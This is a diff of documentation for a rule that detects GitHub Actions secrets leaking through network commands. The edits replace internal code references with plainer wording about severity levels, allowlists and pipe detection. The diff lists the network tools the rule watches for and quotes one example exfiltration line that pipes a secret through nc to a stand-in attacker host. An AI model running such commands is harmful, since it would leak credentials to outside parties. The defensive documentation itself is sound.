@@ -17,12 +17,12 @@ The `secret-exfiltration` rule detects patterns where GitHub Actions secrets may
 
 ## Severity Levels
 
-Severity is decided **per argument**, not per command. The rule emits two levels (`critical` and `high`) via `severityForCallArg` (`pkg/core/secretexfiltration.go:1273`):
+Severity is decided **per argument**, not per command. The rule emits two levels (`critical` and `high`):
 
 - **Critical** is emitted when **both** of the following hold:
   - The command is `curl` or `wget`, AND
   - The secret rides on a **data flag** — for `curl`: `-d` / `--data` / `--data-raw` / `--data-binary` / `--data-urlencode` / `-F` / `--form` / `-H` / `--header`; for `wget`: `--post-data` / `--post-file` / `--header`.
-- **High** is emitted in every other case the rule observes a secret leaving via a network command — including curl/wget when the secret is on a non-data argument (e.g. embedded in the URL), and any use of `http` / `https` (HTTPie) / `nc` / `netcat` / `ncat` / `telnet` / `socat` / `dig` / `nslookup` / `host`. These commands have no `dataFlags` table; their severity always degrades to **High** because the rule does not attempt argument classification on them.
+- **High** is emitted in every other case the rule observes a secret leaving via a network command — including curl/wget when the secret is on a non-data argument (e.g. embedded in the URL), and any use of `http` / `https` (HTTPie) / `nc` / `netcat` / `ncat` / `telnet` / `socat` / `dig` / `nslookup` / `host`. These commands have no per-flag data-flag classification; their severity always degrades to **High** because the rule does not attempt argument classification on them.
 
 The `-X POST` flag is **not** used as a signal — the rule keys on the data-flag presence of the secret, not the HTTP method.
 
@@ -100,7 +100,7 @@ This means `env:` is **not** a mitigation for exfiltration — it is only a miti
 
 ## Safe Patterns (Not Flagged)
 
-The patterns below are **not flagged because their commands are outside `networkCommands`** (`npm`, `docker`, `aws`, `gcloud`, `az`, `gh`, `git`, `terraform`, `vault`, `twine`, …) — they are not "allowlisted destinations", they are simply not commands the rule analyzes. If you wrap any of these tools so that `curl`/`wget`/`nc`/etc. is actually invoked in the same step, that wrapped call will be analyzed normally.
+The patterns below are **not flagged because their commands are not network commands the rule analyzes** (`npm`, `docker`, `aws`, `gcloud`, `az`, `gh`, `git`, `terraform`, `vault`, `twine`, …) — they are not "allowlisted destinations", they are simply outside the rule's analysis scope. If you wrap any of these tools so that `curl`/`wget`/`nc`/etc. is actually invoked in the same step, that wrapped call will be analyzed normally.
 
 ### Package Publishing
 
@@ -193,7 +193,7 @@ The "Risk Level" column shows the severity emitted **when a secret reaches a dat
 
 ### Stdin / Pipe Sink Detection
 
-For `nc` / `netcat` / `ncat` / `telnet` / `socat`, the rule additionally tracks **PipeInputs** (commands feeding the network tool through a shell pipe) and **StdinInputs** (commands feeding it via `<<<`, `<`, or heredoc). A `printf '%s' "$SECRET" | nc attacker 443` invocation is flagged because the secret reaches the network tool's stdin, even though it never appears as a positional argument.
+For `nc` / `netcat` / `ncat` / `telnet` / `socat`, the rule additionally tracks commands feeding the tool through a shell pipe, and via `<<<` / `<` / heredoc. A `printf '%s' "$SECRET" | nc attacker 443` invocation is flagged because the secret reaches the network tool's stdin, even though it never appears as a positional argument.
 
 ### Mixed-Destination Semantics
 
@@ -201,7 +201,7 @@ When a single command invocation has multiple destination arguments (e.g. `curl 
 
 ## Trusted Domains (Allowlisted)
 
-The allowlist is **per-command**, not flat. Each network command has its own `legitPatterns` set in `pkg/core/secretexfiltration.go`; a host trusted under `curl` is not automatically trusted under `wget` or HTTPie. For example, `api.telegram.org` is allowlisted only for `curl` — using `http` / `https` (HTTPie) to reach the same host still flags.
+The allowlist is **per-command**, not flat. Each network command has its own allowlist; a host trusted under `curl` is not automatically trusted under `wget` or HTTPie. For example, `api.telegram.org` is allowlisted only for `curl` — using `http` / `https` (HTTPie) to reach the same host still flags.
 
 | Command | Allowlisted destinations |
 |---------|--------------------------|
@@ -213,11 +213,11 @@ The allowlist is **per-command**, not flat. Each network command has its own `le
 | `nslookup` | `8.8.8.8`, `1.1.1.1`, `localhost` |
 | `host` | `8.8.8.8`, `1.1.1.1` |
 
-> **Note on prior revisions**: earlier versions of this documentation listed `vault.*` (wildcard), `artifactory`, and `nexus` as allowlisted; those entries are **not** present in any command's `legitPatterns` and were incorrect, so they have been removed. Bare `github.com`, by contrast, **is** allowlisted — but only under `wget` (see `pkg/core/secretexfiltration.go:146`); it is **not** trusted under `curl`, `http`, or `https`. Use the per-workflow `allowed-hosts` directive (below) to add your own internal Vault or Artifactory hosts.
+> **Note on prior revisions**: earlier versions of this documentation listed `vault.*` (wildcard), `artifactory`, and `nexus` as allowlisted; those entries are **not** present in any command's allowlist and were incorrect, so they have been removed. Bare `github.com`, by contrast, **is** allowlisted — but only under `wget`; it is **not** trusted under `curl`, `http`, or `https`. Use the per-workflow `allowed-hosts` directive (below) to add your own internal Vault or Artifactory hosts.
 
 ### Per-Workflow `allowed-hosts` Directive
 
-You can extend the allowlist on a per-workflow basis with a comment directive in the workflow file. The directive is parsed by the rule and merged with the global `legitPatterns` set for that workflow only. Directive-sourced entries that are declared but never matched produce a **dead-allow** warning, and entries that fail to parse produce an **invalid-entry** warning — see the next two subsections.
+You can extend the allowlist on a per-workflow basis with a comment directive in the workflow file. The directive is parsed by the rule and merged with the built-in allowlist for that workflow only. Directive-sourced entries that are declared but never matched produce a **dead-allow** warning, and entries that fail to parse produce an **invalid-entry** warning — see the next two subsections.
 
 ### Dead-Allow Warning
 
@@ -265,7 +265,7 @@ After:
 # moving the secret into env: does NOT change the severity — the
 # rule still tracks it. The fix here is the trusted destination
 # (api.segment.io would also need an allowed-hosts directive if
-# not in the built-in legitPatterns set).
+# not in the built-in allowlist).
 - env:
     ANALYTICS_KEY: ${{ secrets.ANALYTICS_KEY }}
   run: |
